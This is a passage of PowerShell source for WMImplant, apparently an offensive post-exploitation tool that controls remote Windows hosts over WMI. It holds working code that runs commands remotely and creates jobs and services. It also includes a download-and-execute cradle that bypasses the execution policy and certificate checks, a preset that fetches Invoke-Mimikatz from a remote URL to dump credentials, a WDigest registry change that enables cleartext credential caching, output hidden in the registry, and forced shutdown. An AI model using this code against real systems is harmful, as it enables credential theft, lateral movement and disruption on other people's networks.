            $PoshURL = Read-Host "What's the url where the PowerShell script you want to run is located? >"
            $PoshFunction = Read-Host "What's the PowerShell Function you'd like to call? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command remote_posh -Url $PoshURL -Function $PoshFunction -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command remote_posh -Url $PoshURL -Function $PoshFunction -Target $GenTarget`n"
                $Command
            }
        }

        "sched_job"
        {
            $GenJobAction = Read-Host "Do you want your job to [list], [create], or [delete] a scheduled job?"
            $GenJobAction = $GenJobAction.Trim().ToLower()

            switch($GenJobAction)
            {
                "list"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction list -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction list -Target $GenTarget`n"
                        $Command
                    }
                }

                "delete"
                {
                    $GenJobID = Read-Host "What is the ID of the job you want to delete? >"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction delete -RemoteID $GenJobID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction delete -RemoteID $GenJobID -Target $GenTarget`n"
                        $Command
                    }
                }

                "create"
                {
                    $GenJobName = Read-Host "What's the full path to the file you'd like to execute? >"
                    $GenJobTime = Read-Host "What time do you want the job to execute? EX: 14:04 >"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction create -RemoteFile $GenJobName -Time $GenJobTime -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command sched_job -JobAction create -RemoteFile $GenJobName -Time $GenJobTime -Target $GenTarget`n"
                        $Command
                    }
                }
            }
        }

        "service_mod"
        {
            $GenServiceAction = Read-Host "Do you want to [start], [stop], [create], or [delete] a service? >"
            $GenServiceAction = $GenServiceAction.Trim().ToLower()
            $GenServiceName = Read-Host "What is the name of the service? >"

            switch($GenServiceAction)
            {
                "start"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction start -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction start -ServiceName $GenServiceName -Target $GenTarget`n"
                        $Command
                    }
                }

                "stop"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction stop -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction stop -ServiceName $GenServiceName -Target $GenTarget`n"
                        $Command
                    }
                }

                "delete"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction delete -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction delete -ServiceName $GenServiceName -Target $GenTarget`n"
                        $Command
                    }
                }

                "create"
                {
                    $GenServicePath = Read-Host "What's the full path to the binary that will be used by the service?"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction create -ServiceName $GenServiceName -RemoteFile $GenServicePath -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction create -ServiceName $GenServiceName -RemoteFile $GenServicePath -Target $GenTarget`n"
                        $Command
                    }
                }
            }
        }

        "wdigest"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget`n"
                $Command
            }
        }

        "process_kill"
        {
            $GenKillMethod = Read-Host "Do you want to kill a process by its [name] or [pid]? >"
            $GenKillMethod = $GenKillMethod.Trim().ToLower()

            switch($GenKillMethod)
            {
                "name"
                {
                    $GenProcName = Read-Host "What's the name of the process you want to kill? >"
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command process_kill -ProcessName $GenProcName -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                        $Command
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -command process_kill -ProcessName $GenProcName -Target $GenTarget`n"
                        $Command
                    }
                }

                "pid"
                {
                    $GenProcID = Read-Host "What's the Process ID of the process you want to kill? >"
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command process_kill -ProcessID $GenProcID -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                        $Command
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -command process_kill -ProcessID $GenProcID -Target $GenTarget -Target $GenTarget`n"
                        $Command
                    }
                }
            }
        }

        "process_start"
        {
            $GenProcPath = Read-Host "What's the path to the binary you want to run? >"
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command process_start -RemoteFile $GenProcPath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command process_start -RemoteFile $GenProcPath -Target $GenTarget`n"
                $Command
            }
        }

        "ps"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command ps -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command ps -Target $GenTarget`n"
                $Command
            }
        }

        "active_users"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command active_users -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command active_users -Target $GenTarget`n"
                $Command
            }
        }

        "basic_info"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command basic_info -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command basic_info -Target $GenTarget`n"
                $Command
            }
        }

        "drive_list"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command drive_list -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command drive_list -Target $GenTarget`n"
                $Command
            }
        }

        "ifconfig"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command ifconfig -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command ifconfig -Target $GenTarget`n"
                $Command
            }
        }

        "installed_programs"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command installed_programs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command installed_programs -Target $GenTarget`n"
                $Command
            }
        }

        "logon_events"
        {
            $GenSaveFile = Read-Host "Do you want to save the log output to a file? [yes/no] >"
            $GenSaveFile = $GenSaveFile.Trim().ToLower()

            switch($GenSaveFile)
            {
                "yes"
                {
                    $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
                    $GenFileSave = $GenFileSave.Trim()

                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -LocalFile $GenFileSave`n"
                        $Command
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -LocalFile $GenFileSave`n"
                        $Command
                    }
                }

                default
                {
                    Write-Host "In here"
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                        $Command
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget`n"
                        $Command
                    }
                }
            }
        }

        "logoff"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command logoff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command logoff -Target $GenTarget`n"
                $Command
            }
        }

        "reboot"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command reboot -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command reboot -Target $GenTarget`n"
                $Command
            }
        }

        "power_off"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command power_off -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command power_off -Target $GenTarget`n"
                $Command
            }
        }

        "vacant_system"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -command vacant_system -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                $Command
            }

            else
            {
                $Command = "`nInvoke-WMImplant -command vacant_system -Target $GenTarget`n"
                $Command
            }
        }

        default
        {
            Write-Output "You did not select a valid command!  Please try again!"
        }
    } #End of switch
} #End of Function

function Invoke-JobMod
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)] 
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$JobAction,
        [Parameter(Mandatory = $False)]
        [string]$JobId,
        [Parameter(Mandatory = $False)]
        [string]$JobProcess,
        [Parameter(Mandatory = $False)]
        [string]$Time
    )

    Process
    {

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$JobAction)
        {
            $JobAction = Read-Host "Do you want to [list], [delete], or [create] a job? >"
            $JobAction = $JobAction.Trim().ToLower()
        }
        else
        {
            $JobAction = $JobAction.Trim().ToLower()
        }

        switch ($JobAction)
        {
            "list"
            {
                if($Creds)
                {
                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds
                }
                else
                {
                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target
                }

                foreach($job in $jobs)
                {
                    if($job -ne $null)
                    {
                        $job
                        Write-Output "Start Time: " $job.StartTime
                    }
                    else
                    {
                        Write-Output "No jobs currently scheduled"
                    }
                }
            }

            "delete"
            {
                if(!$JobId)
                {
                    $JobId = Read-Host "What is the job ID of the job you'd like to delete? >"
                    $JobId = $JobId.Trim()
                }

                Write-Verbose "Deleting job $JobId"

                if($Creds)
                {
                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds -Filter "jobID = $JobId"
                }
                else
                {
                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Filter "jobID = $JobId"
                }

                $job.delete()
                Write-Verbose "Job $JobId has been removed"                
            }

            "create"
            {
                if(!$JobProcess)
                {
                    $JobProcess = Read-Host "What is the full path to the file you'd like to start with a job? >"
                    $JobProcess = $JobProcess.Trim()
                }

                if(!$Time)
                {
                    $Time = Read-Host "What time do you want this to execute? (Ex: 14:04) >"
                    $Time = $Time.Trim()
                }

                Write-Verbose "Creating job on remote system"
                $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
                $Time = $wmi_sched_job.ConvertFromDateTime($Time)

                if($Creds)
                {
                    (Get-WmiObject -list win32_scheduledjob -ComputerName $Target -Credential $Creds).Create($JobProcess,$Time)
                }
                else
                {
                    (Get-WmiObject -list win32_scheduledjob -ComputerName $Target).Create($JobProcess,$Time)
                }
            }
        }
    }
    end{}
}

function Invoke-ProcessPunisher
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$PName,
        [Parameter(Mandatory = $False)] 
        [string]$ProcId
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$PName -and !$ProcId)
        {
            $kill_method = Read-Host "Do you want to kill a process by [name] or [pid]? >"
            $kill_method = $kill_method.Trim().ToLower()

            if($kill_method -eq "name")
            {
                $PName = Read-Host "What is the name of the process you want to kill? >"
                $PName = $PName.Trim().ToLower()
            }
            elseif($kill_method -eq "pid")
            {
                $ProcID = Read-Host "What is the process id you want to kill? >"
                $ProcID = $ProcID.Trim().ToLower()
            }
            else
            {
                Throw "You need to kill a process by its name or PID!"
            }
        }

        if($PName)
        {
            Write-Verbose "Killing process via process name"

            if($Creds)
            {
                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
        }

        elseif($ProcID)
        {
            Write-Verbose "Killing process via process ID"

            if($Creds)
            {
                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
        }
    }
    end{}
}

function Invoke-PowerOptionsWMI
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
        [switch]$Shutdown,
        [Parameter(Mandatory = $False, ParameterSetName='reboot')] 
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='logoff')] 
        [switch]$Logoff
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Shutdown -and !$Reboot -and !$Logoff)
        {
            $Action = Read-Host "Are you looking to [reboot], [shutdown], or [logoff] users on the target system? >"
            $Action = $Action.Trim().ToLower()

            switch($Action)
            {
                "reboot"
                {
                    $Reboot = $true
                }

                "shutdown"
                {
                    $Shutdown = $true
                }

                "logoff"
                {
                    $Logoff = $true
                }
            }
        }

        if($Shutdown)
        {
            $power_option = 5
        }
        elseif($Reboot)
        {
            $power_option = 6
        }
        elseif($Logoff)
        {
            $power_option = 4
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            (gwmi win32_operatingsystem -Credential $Creds -ComputerName $Target).Win32Shutdown($power_option)
        }
        else
        {
            (gwmi win32_operatingsystem -ComputerName $Target).Win32Shutdown($power_option)
        }
    }
    end{}
}

function Invoke-ProcSpawn
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Command
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Command)
        {
            $Command = Read-Host "What command do you want to run? >"
            $Command = $Command.Trim()
        }

        if($Creds)
        {
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -Computername $Target
        }

        else
        {
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $Target
        }
    }

    end{}
}

function Invoke-RegValueMod
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$RegMethod,
        [Parameter(Mandatory = $False)] 
        [string]$RegHive,
        [Parameter(Mandatory = $False)] 
        [string]$RegKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegValue,
        [Parameter(Mandatory = $False)] 
        [string]$RegData
    )

    Process
    {
        $hklm = 2147483650
        $hkcu = 2147483649
        $hkcr = 2147483648
        $hkusers = 2147483651
        $hkcurrentconfig = 2147483653

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$RegMethod)
        {
            $RegMethod = Read-Host "Do you want to [create] or [delete] a string registry value? >"
            $RegMethod = $RegMethod.Trim().ToLower()
        }

        if(!$RegHive)
        {
            $RegHive = Read-Host "What hive would you like to modify, [hklm] or [hkcu]? >"
            $RegHive = $RegHive.Trim().ToLower()

            if($RegHive.ToLower() -eq "hklm")
            {
                $hivevalue = $hklm
            }
            else
            {
                $hivevalue = $hkcu
            }
        }
        else
        {
            if($RegHive.ToLower() -eq "hklm")
            {
                $hivevalue = $hklm
            }
            else
            {
                $hivevalue = $hkcu
            }
        }

        if(!$RegKey)
        {
            $RegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
        }

        if(!$RegValue)
        {
            $RegValue = Read-Host "What's the registry value you'd like to modify? Ex: WMImplantInstalled >"
        }

        switch($RegMethod)
        {
            "create"
            {
                if(!$RegData)
                {
                    $RegData = Read-Host "What's the data you'd like for the registry value being modified? >"
                }

                if($Creds)
                {
                    if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig") 
                    {
                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target -Credential $Creds
                    }
                    else
                    {
                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target -Credential $Creds
                    }
                }

                else
                {
                    if($RegValue -eq "UseLogonCredential")
                    {
                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target
                    }
                    else
                    {
                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target
                    }
                }
            }

            "delete"
            {
                if($Creds)
                {
                    Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegValue -ComputerName $Target -Credential $Creds
                }

                else
                {
                    Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegValue -ComputerName $Target
                }
            }
        }
    }
    end{}
}

function Invoke-RemoteScriptWithOutput
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Url,
        [Parameter(Mandatory = $False)] 
        [string]$Function
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Url)
        {
            $Url = Read-Host "Please provide the full url to the PowerShell script you'd like to run >"
            $Url = $Url.Trim()
        }

        if(!$Function)
        {
            $Function = Read-Host "Please provide the PowerShell function you'd like to run >"
            $Function = $Function.Trim()
        }

        # setting variables for registry storage
        #hklm = 2147483650
        #hkcu = 2147483649
        #hkcr = 2147483648
        #hkusers = 2147483651
        #hkcurrentconfig = 2147483653
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        Write-Verbose "Building PowerShell command"

        $Command = 'powershell -nop -exec bypass -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
        $Command += "'$Url'"
        $Command += ')); $output = '
        $Command += "$Function;"
        $Command += ' $bytes = [System.Text.Encoding]::Ascii.GetBytes($output); $EncodedText = [Convert]::ToBase64String($bytes);'
        $Command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'

        Write-Verbose "Running command on remote system..."

        if($Creds)
        {
            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -ComputerName $Target
        }
        else
        {
            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -ComputerName $Target
        }

        # Grab file from remote system's registry
        Write-Verbose "Sleeping, and then reading file from remote registry"
        Start-Sleep -s 30

        if($Creds)
        {   
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
        }

        $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
        # Print to console
        $enc = [System.Text.Encoding]::ASCII
        $enc.GetString($decode)

        # Removing Registry value from remote system
        Write-Verbose "Removing registry value from remote system"

        if($Creds)
        {
            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
        }
        else
        {
            $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
        }

        Write-Verbose "Done!"
    }
}

function Invoke-ServiceMod
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$Service,
        [Parameter(Mandatory = $False)] 
        [switch]$Start,
        [Parameter(Mandatory = $False)] 
        [switch]$Stop,
        [Parameter(Mandatory = $False)] 
        [switch]$Create,
        [Parameter(Mandatory = $False)] 
        [string]$NewServiceName,
        [Parameter(Mandatory = $False)] 
        [string]$NewServicePath,
        [Parameter(Mandatory = $False)] 
        [switch]$Delete
    )

    Process
    {   
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Start -and !$Stop -and !$Delete -and !$Create)
        {
            $ServiceGoal = Read-Host "Do you want to [stop], [start], [delete], or [create] a service? >"
            $ServiceGoal = $ServiceGoal.Trim().ToLower()

            switch($ServiceGoal)
            {
                "start"
                {
                    $Start = $true
                }

                "stop"
                {
                    $Stop = $true
                }

                "delete"
                {
                    $Delete = $true
                }

                "create"
                {
                    $Create = $true
                }
            }
        }

        if ($Start -or $Stop -or $Delete)
        {
            if(!$Service)
            {
                $Service = Read-Host "What is the name of the service you are targeting? >"
                $Service = $Service.Trim()
            }

            $filter = "name='$Service'"

            if($Creds)
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter -Credential $Creds
            }
            else
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter
            }
            if($Start)
            {
                $SystemService.StartService()
            }
            elseif($Stop)
            {
                $SystemService.StopService()
            }
            elseif($Delete)
            {
                $SystemService.Delete()
            }
        }
        elseif($Create)
        {
            if(!$NewServiceName)
            {
                $NewServiceName = Read-Host "Please provide the name for the service you'd like to create. >"
                $NewServiceName = $NewServiceName.Trim()
            }

            if(!$NewServicePath)
            {
                $NewServicePath = Read-Host "Please provide the path to your new service binary. >"
                $NewServicePath = $NewServicePath.Trim()
            }

            $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
            
            if($Creds)
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target -Credential $Creds
            }
            else
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target
            }
        }
    }
    end{}
}

function Invoke-WMImplant
{
    <#
    .SYNOPSIS
    This function starts all of WMImplant and is designed to display the main menu.

    .DESCRIPTION
    This is the main WMImplant function.  When calling Invoke-WMImplant you will be presented with the main menu.

    .PARAMETER RemoteUser
    Specify a username. Default is the current user context.  This user is used to connect to remote systems.

    .PARAMETER RemotePass
    Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.

    .PARAMETER LocalUser
    This parameter is required when a remote system needs to connect back to the local system for a WMImplant command.

    .PARAMETER LocalPass
    This parameter is the password for the account used when it is required for a remote system to connect back to the local system for a WMImplant command.

    .PARAMETER Command
    If using the CLI, specify the command that you want to use.

    .PARAMETER ListCommands
    List the available commands within WMImplant.

    .PARAMETER LocalFile
    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally).

    .PARAMETER RemoteFile
    This parameter is used when user's need to provide the path to a file remotely for interaction (downloading a remote file or providing a path to upload a file to) or when needing to specify a directory (such as a directory where you want to list all its contents).
    
    .PARAMETER RemoteDrive
    This parameter is used when you need to specify a drive to search on a remote system.

    .PARAMETER RemoteCommand
    This parameter is used to specify a command to run on a remote system.

    .PARAMETER RemoteExtension
    This parameter is used when you need to specify a file extension to search for on a remove machine.

    .PARAMETER Target
    This parameter specifies the system to execute the WMImplant command on.

    .PARAMETER ProcessName
    This parameter specifies the process name when killing a process by name.

    .PARAMETER ProcessID
    This parameter specifies the process ID to use when killing a process by ID.

    .PARAMETER JobAction
    This parameter specifies if a job or service will be created, deleted, or if all jobs will be listed.

    .PARAMETER ServiceAction
    This parameter specifies if a service will be started, stopped, deleted, or created.

    .PARAMETER ServiceName
    This parameter specifies the name of the service when one is being created.

    .PARAMETER RemoteID
    This parameter can be used to specify a Job ID for deletion.

    .PARAMETER Time
    This parameter can be used to specify the time (Ex: 15:35).

    .PARAMETER RegMethod
    This parameter specifies if you are creating or deleting a registry value.

    .PARAMETER RegHive
    This parameter specifies the registry hive you will use (between hklm and hkcu).

    .PARAMETER RegKey
    This parameter specifies the registry key that will be modified.

    .PARAMETER RegValue
    This parameter specifies the registry value that will be modified.

    .PARAMETER RegData
    This parameter contains the data that's added to a registry value when it is created.

    .EXAMPLE
    > Invoke-WMImplant
    This will run the main menu and allow for easy interaction

    .EXAMPLE
    > Invoke-WMImplant -ListCommands
    This will list all available commands supported within WMImplant.

    .EXAMPLE
    > Invoke-WMImplant -Command cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -Target windowspc
    This command uses the "cat" command, and attempts to read the secrets.txt file with the provided username and password on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Command cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -Target windowspc
    This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Command upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows -LocalUser King -LocalPass ofthejungle
    This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.

    .EXAMPLE
